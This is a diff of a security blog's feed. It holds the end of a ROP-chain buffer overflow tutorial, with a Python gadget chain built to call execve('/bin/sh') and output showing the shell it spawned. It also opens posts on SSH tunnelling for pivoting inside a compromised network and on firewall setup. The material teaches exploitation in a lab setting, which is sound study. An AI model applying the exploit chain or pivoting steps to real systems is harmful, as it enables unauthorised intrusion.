+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00075655&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# mov dword ptr [edx], eax ; ret
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# First argument has to be in ebx
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00018c85&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop ebx ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x001d8040&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# @ .data
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Second argument in ecx register which is null
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x001926d5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop ecx ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x001d8048&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# @ .data + 8
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Third argument in edx register which is null
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00001aae&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop edx ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x001d8048&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# @ .data + 8
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Now, we have to place 11 in eax which is number of execve() system call
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0002e565&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# xor eax, eax ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00024bf8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# inc eax ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00024bf8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# inc eax ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00024bf8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# inc eax ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00024bf8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# inc eax ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00024bf8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# inc eax ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00024bf8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# inc eax ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00024bf8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# inc eax ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00024bf8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# inc eax ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00024bf8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# inc eax ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00024bf8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# inc eax ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00024bf8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# inc eax ; ret
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Syscall exception
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00002d37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# int 0x80
+&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;To this code we have added the offset to EIP offset which is 18 bytes and also the base address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc&lt;/code&gt; library. Here the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pack&lt;/code&gt; library is used to automatically reverse the address as per little endian format requirements.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./rop $(python rop-exploit.py)
+Buf:AAAAAAAAAAAAAAAAAA����@P����
+$ whoami
+secure
+$ id
+uid=1000(secure) gid=1000(secure) groups=1000(secure)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Voila!! we have successfully executed the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; using ROP chain.&lt;/p&gt;</content><author><name>Jaimandeep Singh</name><email>karma.jaimandeep@gmail.com</email></author><category term="Buffer Overflow" /><category term="ROP Chain" /><category term="ROP Chains" /><category term="DEP" /><category term="Stack Canaries" /><category term="Return Oriented Programming" /><category term="gdb" /><category term="Buffer Overflow" /><summary type="html">Birds Eye View and the Deep Dive Series</summary></entry><entry><title type="html">Understanding SSH Tunnelling and Proxychains</title><link href="https://cyber-rosh.github.io/musings/ssh-tunnel/" rel="alternate" type="text/html" title="Understanding SSH Tunnelling and Proxychains" /><published>2021-06-07T00:00:00+05:30</published><updated>2021-06-07T00:00:00+05:30</updated><id>https://cyber-rosh.github.io/musings/ssh-tunnel</id><content type="html" xml:base="https://cyber-rosh.github.io/musings/ssh-tunnel/">&lt;p&gt;Having a good knowledge on SSH tunnelling is an important tool in the arsenal for pentesting engagements and for playing networked Capture The Flag (CTF) events.&lt;/p&gt;
 
 &lt;h1 id=&quot;problem-statement&quot;&gt;Problem Statement&lt;/h1&gt;
 &lt;p&gt;We have gained an initial foothold on one of the internal system of an organization. Now, we want to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scans on the internal networks to pivot laterally. The organization is also running an internally hosted website which is not accessible from outside. How do we expose the internal ports/traffic to the outside attacker machine so that we can run our tools and gain access to resources which are not exposed to the outside world?&lt;/p&gt;
@@ -6,7 +265,7 @@
 &lt;h1 id=&quot;cyber-range-setup&quot;&gt;Cyber Range Setup&lt;/h1&gt;
 &lt;p&gt;The setup of the cyber range is given in figure below:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;../assets/images/2021-06-07-ssh-tunnel-fig-1.png&quot; alt=&quot;Deployment Architecture of Application&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/musings/assets/images/2021-06-07-ssh-tunnel-fig-1.png&quot; alt=&quot;Deployment Architecture of Application&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;actions-at-victim-machine&quot;&gt;Actions at Victim Machine&lt;/h1&gt;
 &lt;h2 id=&quot;step-1&quot;&gt;Step 1:&lt;/h2&gt;
@@ -103,7 +362,7 @@ socks5 &amp;lt;vps-public-ip&amp;gt; 8080
   &lt;li&gt;Web Application Firewall&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/2021-05-22-web-apps-fig-1.png&quot; alt=&quot;Deployment Architecture of Application&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/musings/assets/images/2021-05-22-web-apps-fig-1.png&quot; alt=&quot;Deployment Architecture of Application&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;infrastructure-firewall&quot;&gt;Infrastructure Firewall&lt;/h2&gt;
 &lt;p&gt;The infrastructure firewall will drop all traffic at ingress of our VPS except that meant for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt;. We can also configure the firewall to limit the traffic from specific IPs/subnets. Some of the sample rules in our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;firewalld&lt;/code&gt; of CentOS7 as given here:&lt;/p&gt;
